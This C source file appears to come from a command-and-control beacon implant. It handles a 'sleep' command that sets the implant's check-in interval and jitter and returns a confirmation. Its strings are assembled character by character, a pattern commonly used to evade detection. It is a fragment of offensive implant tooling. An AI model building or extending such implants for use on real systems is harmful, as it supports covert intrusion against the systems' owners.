/* beacon/src/Commands/Sleep.c
 * CMD_SLEEP (0x11) - update sleep interval and jitter, return confirmation. */

#include "Nax.h"

FUNC INT NaxCmdSleep( PNAX_INSTANCE Nax,
                      const PBYTE args, UINT32 args_len,
                      PBYTE out, UINT32* out_len ) {
    if ( args_len < 5 || args == NULL )
        return NAX_ERR_INVAL;

    UINT32 new_ms     = (UINT32)args[0] | ( (UINT32)args[1] << 8 ) | ( (UINT32)args[2] << 16 ) | ( (UINT32)args[3] << 24 );
    BYTE   new_jitter = args[4];
    if ( new_jitter > 100 )
        new_jitter = 100;

    Nax->Config.SleepMs   = new_ms;
    Nax->Config.JitterPct = new_jitter;

    if ( *out_len < 64 )
        return NAX_ERR_NOMEM;

    /* Binary prefix: sleep_ms(4LE) | jitter_pct(1) */
    PBYTE p    = out;
    p[0]       = (BYTE)( new_ms & 0xFFu );
    p[1]       = (BYTE)( ( new_ms >> 8 ) & 0xFFu );
    p[2]       = (BYTE)( ( new_ms >> 16 ) & 0xFFu );
    p[3]       = (BYTE)( ( new_ms >> 24 ) & 0xFFu );
    p[4]       = new_jitter;
    UINT32 pos = 5;

    /* "sleep=" */
    CHAR pfx[] = { 's', 'l', 'e', 'e', 'p', '=' };
    MmCopy( out + pos, pfx, 6 );
    pos += 6;
    if ( new_ms == 0 || ( new_ms % 1000u ) == 0 ) {
        pos += NaxUToStr( new_ms / 1000u, (PCHAR)out + pos );
        out[pos++] = 's';
    } else {
        pos += NaxUToStr( new_ms, (PCHAR)out + pos );
        out[pos++] = 'm';
        out[pos++] = 's';
    }

    if ( new_jitter > 0 ) {
        CHAR jfx[] = { ' ', 'j', 'i', 't', 't', 'e', 'r', '=' };
        MmCopy( out + pos, jfx, 8 );
        pos += 8;
        pos += NaxUToStr( (UINT32)new_jitter, (PCHAR)out + pos );
        out[pos++] = '%';
    }

    *out_len = pos;
    return NAX_OK;
}
